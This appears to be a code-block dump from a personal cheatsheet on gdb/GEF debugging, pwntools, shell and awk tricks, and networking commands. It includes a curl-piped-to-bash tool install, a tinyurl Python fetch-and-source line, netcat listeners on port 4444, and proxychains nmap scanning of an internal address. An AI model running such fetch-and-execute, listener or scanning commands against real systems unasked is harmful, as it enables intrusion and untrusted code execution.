<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">x/<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>sz<span class="token punctuation">]</span><span class="token punctuation">[</span>fmt<span class="token punctuation">]</span> <span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>

<span class="token comment"># n: Number of data to print.</span>
<span class="token comment"># sz: b(byte), h(halfword), w(word), g(giant, 8 bytes)</span>
<span class="token comment"># fmt: Format to print data.</span>
<span class="token comment"># - o(octal), x(hex), d(decimal), u(unsigned decimal),</span>
<span class="token comment"># - z(hex, zero padded on the left)</span>
<span class="token comment"># - t(binary), f(float), c(char), s(string)</span>
<span class="token comment"># - a(address), i(instruction),</span>

<span class="token comment"># 20 words.</span>
x/20wx 0x7fffffffd000

<span class="token comment"># 20 bytes.</span>
x/20bx 0x7fffffffd000

<span class="token comment"># View as string.</span>
x/s 0x7fffffffd000</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">set</span> <span class="token punctuation">{</span>c-type<span class="token punctuation">}</span><span class="token operator">&lt;</span>address<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token operator">&lt;</span>value<span class="token operator">&gt;</span>

<span class="token comment"># For self-compiled sources.</span>
<span class="token builtin class-name">set</span> var i <span class="token operator">=</span> <span class="token number">10</span>
<span class="token builtin class-name">set</span> <span class="token punctuation">{</span>int<span class="token punctuation">}</span>0x83040 <span class="token operator">=</span> <span class="token number">4</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment">## C++</span>
<span class="token builtin class-name">set</span> *<span class="token punctuation">{</span>uint32_t*<span class="token punctuation">}</span>0x7fffffffd000 <span class="token operator">=</span> 0xdeadbeef
<span class="token comment">## Rust</span>
<span class="token builtin class-name">set</span> *<span class="token punctuation">(</span>0x7fffffffd000 as *const u32<span class="token punctuation">)</span> <span class="token operator">=</span> 0xdeadbeef</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token function">find</span> <span class="token operator">&lt;</span>start<span class="token operator">&gt;</span>, <span class="token operator">&lt;</span>end<span class="token operator">&gt;</span>, <span class="token operator">&lt;</span>data<span class="token punctuation">..</span>.<span class="token operator">&gt;</span>
<span class="token function">find</span> <span class="token operator">&lt;</span>start<span class="token operator">&gt;</span>, +<span class="token operator">&lt;</span>length<span class="token operator">&gt;</span>, <span class="token operator">&lt;</span>data<span class="token punctuation">..</span>.<span class="token operator">&gt;</span>

<span class="token comment"># Find string (including null byte).</span>
<span class="token function">find</span> 0x7fffffffd000, 0x7ffffffff000, <span class="token string">"Hello world!"</span>

<span class="token comment"># Find string (excluding null byte).</span>
<span class="token function">find</span> 0x7fffffffd000, 0x7ffffffff000, <span class="token string">'H'</span>,<span class="token string">'e'</span>,<span class="token string">'l'</span>,<span class="token string">'l'</span>,<span class="token string">'o'</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token function">find</span> <span class="token punctuation">[</span>/sn<span class="token punctuation">]</span> <span class="token punctuation">..</span>.
<span class="token comment"># s: b(byte), h(halfword), w(word), g(giant, 8 bytes)</span>
<span class="token comment"># n: max number of finds</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">info proc mappings
vmmap <span class="token comment"># (GEF)</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># View 100 words (hex) at $rsp.</span>
x/100wx <span class="token variable">$rsp</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">info frame</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">backtrace
bt</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">heap

<span class="token comment"># View all chunks.</span>
heap chunks

<span class="token comment"># View specific chunks.</span>
heap chunk <span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>

<span class="token comment"># View state of bins (freed chunks).</span>
heap bins</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">break</span> *<span class="token operator">&lt;</span>address<span class="token operator">&gt;</span>
<span class="token builtin class-name">break</span> <span class="token operator">&lt;</span>line-number <span class="token operator">|</span> label<span class="token operator">&gt;</span> <span class="token comment"># For self-compiled programs.</span>
<span class="token builtin class-name">break</span> <span class="token operator">&lt;</span>stuff<span class="token punctuation">..</span>.<span class="token operator">&gt;</span> <span class="token keyword">if</span> <span class="token operator">&lt;</span>expression<span class="token operator">&gt;</span>

<span class="token comment"># Address.</span>
<span class="token builtin class-name">break</span> *0x401234
b *0x401234

<span class="token comment"># Offset from function.</span>
<span class="token builtin class-name">break</span> *main+200

<span class="token comment"># Line number and expression.</span>
<span class="token builtin class-name">break</span> main.c:6 <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">5</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">info breakpoints
info b</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Enable/disable all breakpoints.</span>
<span class="token builtin class-name">enable</span>
disable

<span class="token comment"># Enable/disable specific breakpoints.</span>
<span class="token builtin class-name">enable</span> <span class="token operator">&lt;</span>breakpoint-id<span class="token operator">&gt;</span>
disable <span class="token operator">&lt;</span>breakpoint-id<span class="token operator">&gt;</span>

<span class="token comment"># Remove breakpoints.</span>
delete <span class="token operator">&lt;</span>breakpoint-id<span class="token operator">&gt;</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">continue</span> <span class="token operator">&lt;</span>ignore-count<span class="token operator">&gt;</span>

<span class="token comment"># Skip 32 breaks.</span>
<span class="token builtin class-name">continue</span> <span class="token number">32</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Enable the breakpoint once.</span>
<span class="token comment"># The breakpoint will be disabled after first hit.</span>
<span class="token builtin class-name">enable</span> once <span class="token operator">&lt;</span>breakpoint-id<span class="token operator">&gt;</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token function">watch</span> <span class="token operator">&lt;</span>expression<span class="token operator">&gt;</span>

<span class="token comment"># Break on write.</span>
<span class="token function">watch</span> *0x7fffffffd000

<span class="token comment"># Break on condition.</span>
<span class="token comment">## Register</span>
<span class="token function">watch</span> <span class="token variable">$rax</span> <span class="token operator">==</span> 0xdeadbeef
<span class="token comment">## Memory</span>
<span class="token comment">### C/C++</span>
<span class="token function">watch</span> *<span class="token punctuation">{</span>uint32_t*<span class="token punctuation">}</span>0x7fffffffd000 <span class="token operator">==</span> 0xdeadbeef
<span class="token comment">### Rust</span>
<span class="token function">watch</span> *<span class="token punctuation">(</span>0x7fffffffd000 as *const u32<span class="token punctuation">)</span> <span class="token operator">==</span> 0xdeadbeef</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Displays table of watchpoints.</span>
info watchpoint
info wat</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Check if hardware watchpoints are supported.</span>
show can-use-hw-watchpoints</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Read watchpoints: break on read.</span>
rwatch *0x7fffffffd000

<span class="token comment"># Access watchpoints: break on read or write.</span>
awatch *0x7fffffffd000</code></pre>
<pre class="language-sh" tabindex="0"><code class="language-sh">gdb <span class="token parameter variable">--batch</span> <span class="token parameter variable">--command</span><span class="token operator">=</span>test.gdb <span class="token parameter variable">--args</span> ./test.exe <span class="token number">5</span></code></pre>
<pre data-language="GDB" class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">source</span> myscript.gdb</code></pre>
<pre class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># via the install script</span>
<span class="token comment">## using curl</span>
<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> <span class="token parameter variable">-fsSL</span> https://gef.blah.cat/sh<span class="token variable">)</span></span>"</span>

<span class="token comment">## using wget</span>
<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">wget</span> https://gef.blah.cat/sh <span class="token parameter variable">-O</span> -<span class="token variable">)</span></span>"</span>

<span class="token comment"># or manually</span>
<span class="token function">wget</span> <span class="token parameter variable">-O</span> ~/.gdbinit-gef.py <span class="token parameter variable">-q</span> https://gef.blah.cat/py
<span class="token builtin class-name">echo</span> <span class="token builtin class-name">source</span> ~/.gdbinit-gef.py <span class="token operator">&gt;&gt;</span> ~/.gdbinit

<span class="token comment"># or alternatively from inside gdb directly</span>
gdb <span class="token parameter variable">-q</span>
<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> pi <span class="token function">import</span> urllib.request as u, tempfile as t<span class="token punctuation">;</span> <span class="token assign-left variable">g</span><span class="token operator">=</span>t.NamedTemporaryFile<span class="token punctuation">(</span>suffix<span class="token operator">=</span><span class="token string">'-gef.py'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> open<span class="token punctuation">(</span>g.name, <span class="token string">'wb+'</span><span class="token punctuation">)</span>.write<span class="token punctuation">(</span>u.urlopen<span class="token punctuation">(</span><span class="token string">'https://tinyurl.com/gef-main'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span> gdb.execute<span class="token punctuation">(</span><span class="token string">'source %s'</span> % g.name<span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

bash <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'bash'</span><span class="token punctuation">)</span>

<span class="token comment"># Attach the debugger</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>bash<span class="token punctuation">,</span> <span class="token triple-quoted-string string">'''
set follow-fork-mode child
break execve
continue
'''</span><span class="token punctuation">)</span>

<span class="token comment"># Interact with the process</span>
bash<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"echo Hello World"</span><span class="token punctuation">)</span></code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">assert</span> <span class="token string">'\xc0'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'\xc3\x80'</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Runs with 'AAAA\x01\x02\x01\x02' as stdin.</span>
r <span class="token operator">&lt;&lt;&lt;</span><span class="token variable"><span class="token variable">$(</span>perl <span class="token parameter variable">-e</span> <span class="token string">'print "A"x4 . "\x01\x02"x2;'</span><span class="token variable">)</span></span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># (Untested)</span>
c <span class="token parameter variable">-A</span> <span class="token operator">&lt;</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span>perl <span class="token parameter variable">-e</span> <span class="token string">'print "\x00\x40\x3d\x38"'</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Prints 'AAAA\x01\x02\x01\x02' to a temporary file.</span>
shell perl <span class="token parameter variable">-e</span> <span class="token string">'print "A"x4 . "\x01\x02"x2;'</span> <span class="token operator">&gt;</span>/tmp/input

<span class="token comment"># Run the program, use the file as stdin.</span>
r <span class="token operator">&lt;</span>/tmp/input</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">set</span> args</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">set</span> args <span class="token punctuation">[</span>arguments<span class="token punctuation">..</span>.<span class="token punctuation">]</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">bash<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"echo '\x01\x02\x03\x04'"</span><span class="token punctuation">)</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">set</span> disable-randomization off</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">pie b <span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>    <span class="token comment"># PIE breakpoint at offset &lt;addr&gt; in code.</span>
pie run         <span class="token comment"># Run with pie breakpoints enabled.</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">context
ctx</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">gef config context.enable <span class="token number">0</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">gef config context.enable <span class="token number">1</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh">^c <span class="token comment"># Duh. https://xkcd.com/416/</span>
^d <span class="token comment"># Exit / EOF.</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh">^r
^s</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token punctuation">[</span> <span class="token number">1</span> <span class="token parameter variable">-eq</span> <span class="token number">1</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">'true'</span> <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">'false'</span>
<span class="token comment"># true</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh">reset</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token builtin class-name">.</span> ~/.zshrc
<span class="token builtin class-name">source</span> ~/.zshrc</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh">tree</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable"><span class="token variable">$((</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span>"</span> <span class="token string">"<span class="token environment constant">$SHELL</span>"</span>
<span class="token comment"># 2 /bin/zsh</span>
<span class="token builtin class-name">echo</span> <span class="token string">'$((1+1))'</span> <span class="token string">'$SHELL'</span>
<span class="token comment"># $((1+1)) $SHELL</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token builtin class-name">echo</span> <span class="token string">$'...'</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token builtin class-name">echo</span> <span class="token string">$'1<span class="token entity" title="\n">\n</span>2<span class="token entity" title="\n">\n</span>3'</span>
<span class="token comment"># 1</span>
<span class="token comment"># 2</span>
<span class="token comment"># 3</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">$'can\'t,don\'t,I\'ll,I\'m,won\'t'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token parameter variable">-vRS</span><span class="token operator">=</span>, <span class="token string">$'$0 ~ /\'t/'</span>
<span class="token comment"># can't</span>
<span class="token comment"># don't</span>
<span class="token comment"># won't</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">mkdir</span> /var/tmp/lol
<span class="token comment"># Permission denied.</span>
<span class="token function">sudo</span> <span class="token operator">!</span><span class="token operator">!</span>
<span class="token comment">#  sudo mkdir /var/tmp/lol</span>
<span class="token comment"># Success!</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">ls</span> long/path
<span class="token builtin class-name">cd</span> <span class="token operator">!</span>$
<span class="token comment">#  cd long/path</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">cat</span> long/path/file.txt
<span class="token function">mv</span> <span class="token string">"!$"</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">dirname</span> <span class="token operator">!</span>$<span class="token variable">)</span></span>/booyah.md"</span>
<span class="token comment">#  mv long/path/file.txt long/path/booyah.md</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token operator">&lt;</span> out.txt <span class="token comment"># Read from file (to stdin).</span>
<span class="token operator">&gt;</span> out.txt <span class="token comment"># Write to file (from stdout).</span>
<span class="token operator">&gt;&gt;</span> out.txt <span class="token comment"># Append to file (from stdout).</span>
<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> out.txt <span class="token comment"># Write to file (from stderr).</span>
<span class="token operator">&amp;&gt;</span> out.txt <span class="token comment"># Redirect all output.</span>
<span class="token operator">&amp;&gt;</span> /dev/null <span class="token comment"># Redirect everything into the void.</span>
<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token comment"># Redirect stderr to stdout.</span>

<span class="token operator">&gt;&amp;</span> <span class="token comment"># Same as `&amp;&gt;`.</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token comment"># Cut third field.</span>
<span class="token function">awk</span> <span class="token string">'$0=$3'</span>
<span class="token comment"># </span>
<span class="token comment"># Print third field. (Pretty much same as the command above.)</span>
<span class="token function">awk</span> <span class="token string">'{print $3}'</span>
<span class="token comment"># </span>
<span class="token comment"># Use ',' as field delimiter, e.g. for CSVs.</span>
<span class="token function">awk</span> -F, <span class="token string">'{print $3}'</span>
<span class="token comment"># </span>
<span class="token comment"># Or use the script variable `FS` (Field Separator).</span>
<span class="token function">awk</span> <span class="token parameter variable">-v</span> <span class="token assign-left variable">FS</span><span class="token operator">=</span>, '<span class="token punctuation">{</span>print <span class="token variable">$3</span><span class="token punctuation">}</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">4</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'$1 % 2 == 1'</span>
<span class="token comment"># 1</span>
<span class="token comment"># 3</span>
<span class="token builtin class-name">echo</span> <span class="token string">$'foo1<span class="token entity" title="\n">\n</span>bar1<span class="token entity" title="\n">\n</span>foo2'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'$0 ~ /^foo/'</span>
<span class="token comment"># foo1</span>
<span class="token comment"># foo2</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token comment"># Add 5 to the first arg, then print the line.</span>
<span class="token function">awk</span> <span class="token string">'{$1 += 5}1'</span>
<span class="token comment"># </span>
<span class="token function">seq</span> <span class="token number">1</span> <span class="token number">3</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{$1 += 5}1'</span>
<span class="token comment"># 6</span>
<span class="token comment"># 7</span>
<span class="token comment"># 8</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">awk</span> <span class="token string">'{print "booyah",$1,"yahoo"}'</span>
<span class="token comment"># awk also has variables, if, for, while, arrays, etc.</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># case-insensitive</span>
<span class="token parameter variable">-i</span>
<span class="token comment"># regex</span>
<span class="token parameter variable">-E</span>
<span class="token comment"># non-match (inVert)</span>
<span class="token parameter variable">-v</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token parameter variable">-P</span> <span class="token operator">&lt;</span>n<span class="token operator">&gt;</span> <span class="token comment"># max procs</span>
<span class="token parameter variable">-n</span> <span class="token operator">&lt;</span>n<span class="token operator">&gt;</span> <span class="token comment"># num args</span>
<span class="token parameter variable">-I</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># pattern to insert into command</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token builtin class-name">echo</span> <span class="token string">$'1<span class="token entity" title="\n">\n</span>2<span class="token entity" title="\n">\n</span>3'</span>
<span class="token comment"># 1</span>
<span class="token comment"># 2</span>
<span class="token comment"># 3</span>
<span class="token builtin class-name">echo</span> <span class="token string">$'1<span class="token entity" title="\n">\n</span>2<span class="token entity" title="\n">\n</span>3'</span> <span class="token operator">|</span> <span class="token function">xargs</span> 
<span class="token comment"># 1 2 3</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">cat</span> files.txt <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-P</span> <span class="token number">4</span> <span class="token parameter variable">-n1</span> ./do-something-to-file.sh</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">1000</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-P</span> <span class="token number">50</span> -I<span class="token punctuation">{</span><span class="token punctuation">}</span> proxychains4 <span class="token parameter variable">-q</span> nmap <span class="token parameter variable">-p</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token parameter variable">-sT</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">--open</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">--oN</span> nmap.txt --append-output <span class="token number">192.168</span>.101.10</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">basename</span> ~/.bashrc
<span class="token comment"># .bashrc</span>
<span class="token function">dirname</span> ~/.bashrc
<span class="token comment"># /home/trebledj</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">pushd</span> <span class="token comment"># Push current directory, for easier returning.</span>
<span class="token function">popd</span>  <span class="token comment"># Return to directory on top of stack.</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token builtin class-name">cd</span> ~/a/b/c
<span class="token function">pushd</span> deep/nested/directory
<span class="token comment"># Jump to `deep/nested/directory`, push `~/a/b/c` into the stack.</span>
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/jump/around/some/more
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/and/a/little/more
<span class="token function">popd</span>  <span class="token comment"># Return to `~/a/b/c`.</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">less</span> file.txt
<span class="token comment"># </span>
<span class="token comment"># Renders ANSI colors.</span>
<span class="token function">less</span> <span class="token parameter variable">-R</span> file.txt
<span class="token comment"># </span>
<span class="token comment"># Pager search becomes case insensitive.</span>
<span class="token function">less</span> <span class="token parameter variable">-I</span> file.txt
<span class="token comment"># </span>
<span class="token comment"># Line numbers.</span>
<span class="token function">less</span> <span class="token parameter variable">-N</span> file.txt</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">j <span class="token comment"># Line down.</span>
k <span class="token comment"># Line up.</span>
f <span class="token comment"># Page down.</span>
b <span class="token comment"># Page up.</span>
d <span class="token comment"># Half-page down.</span>
u <span class="token comment"># Half-page up.</span>

g <span class="token comment"># Go to start of file.</span>
G <span class="token comment"># Go to end of file.</span>

<span class="token operator">&lt;</span>n<span class="token operator">&gt;</span> g <span class="token comment"># Go to nth line.</span>

<span class="token comment"># Go to the n% line of the file.</span>
<span class="token operator">&lt;</span>n<span class="token operator">&gt;</span> p
20p 40p 50p 80p

<span class="token comment"># What's the current line?</span>
^g</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Search (regex enabled).</span>
/ <span class="token operator">&lt;</span>pattern<span class="token operator">&gt;</span>
<span class="token comment"># For case-insensitive search, use `less -I`.</span>

<span class="token comment"># Navigate search results: next/prev result.</span>
nN

<span class="token comment"># Filter lines by search.</span>
<span class="token operator">&amp;</span> <span class="token operator">&lt;</span>pattern<span class="token operator">&gt;</span>
<span class="token comment"># Filter NON-MATCHING lines</span>
<span class="token operator">&amp;</span> <span class="token operator">!</span> <span class="token operator">&lt;</span>pattern<span class="token operator">&gt;</span>
<span class="token comment"># Clear filter.</span>
<span class="token operator">&amp;</span> <span class="token operator">&lt;</span>enter<span class="token operator">&gt;</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Continuous feed (e.g. for streams of data)</span>
F</code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token comment"># Next file.</span>
:n
<span class="token comment"># Previous file.</span>
:p</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh">^z <span class="token comment"># Push process to background (and pause it).</span>
<span class="token function">bg</span> <span class="token comment"># Start background process.</span>
<span class="token function">fg</span> <span class="token comment"># Bring most recent background process into foreground.</span>
<span class="token function">fg</span> <span class="token number">2</span> <span class="token comment"># Bring job 2 into foreground.</span>
<span class="token function">jobs</span> <span class="token comment"># View background jobs.</span>
<span class="token comment"># </span>
^c <span class="token comment"># Good ol' ctrl-c stops the process in fg.</span>
<span class="token function">kill</span> <span class="token operator">&lt;</span>pid<span class="token operator">&gt;</span> <span class="token comment"># Kill process with given process ID.</span>
<span class="token comment"># </span>
<span class="token comment"># Start a command in the background.</span>
<span class="token operator">&lt;</span>cmd<span class="token operator">&gt;</span> <span class="token operator">&amp;</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh">python <span class="token parameter variable">-m</span> http.server <span class="token number">8080</span> <span class="token operator">&amp;</span>
<span class="token comment"># [1] 17999</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">fg</span>
^c</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">kill</span> <span class="token number">17999</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">ps</span> aux</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">ifconfig</span>
<span class="token function">ifconfig</span> tun0</code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">curl</span> ifconfig.me
<span class="token comment"># X.X.X.X</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token function">netstat</span> <span class="token parameter variable">-anp</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token comment"># Initiate a connection.</span>
<span class="token function">nc</span> <span class="token number">192.168</span>.1.1 <span class="token number">8080</span>
<span class="token comment"># </span>
<span class="token comment"># Listen for a connection.</span>
<span class="token function">nc</span> <span class="token parameter variable">-nlvp</span> <span class="token number">4444</span>
<span class="token comment"># </span>
<span class="token comment"># Listen persistently (keep listening after disconnect).</span>
<span class="token function">nc</span> <span class="token parameter variable">-nklvp</span> <span class="token number">4444</span></code></pre>
<pre data-lang-off="" class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token comment"># Download and save to a local file.</span>
<span class="token function">curl</span> <span class="token operator">&lt;</span>url<span class="token operator">&gt;</span> <span class="token parameter variable">-O</span>
<span class="token function">wget</span> <span class="token operator">&lt;</span>url<span class="token operator">&gt;</span>
<span class="token comment"># </span>
<span class="token comment"># Download with a custom filename.</span>
<span class="token function">curl</span> <span class="token operator">&lt;</span>url<span class="token operator">&gt;</span> <span class="token parameter variable">-o</span> filename.txt
<span class="token function">wget</span> <span class="token operator">&lt;</span>url<span class="token operator">&gt;</span> <span class="token parameter variable">-O</span> filename.txt
<span class="token comment"># </span>
<span class="token comment"># Download silently and display in `less`.</span>
<span class="token function">curl</span> <span class="token operator">&lt;</span>url<span class="token operator">&gt;</span> <span class="token parameter variable">-s</span> <span class="token operator">|</span> <span class="token function">less</span>
<span class="token function">wget</span> <span class="token operator">&lt;</span>url<span class="token operator">&gt;</span> <span class="token parameter variable">-s</span> <span class="token operator">|</span> <span class="token function">less</span>
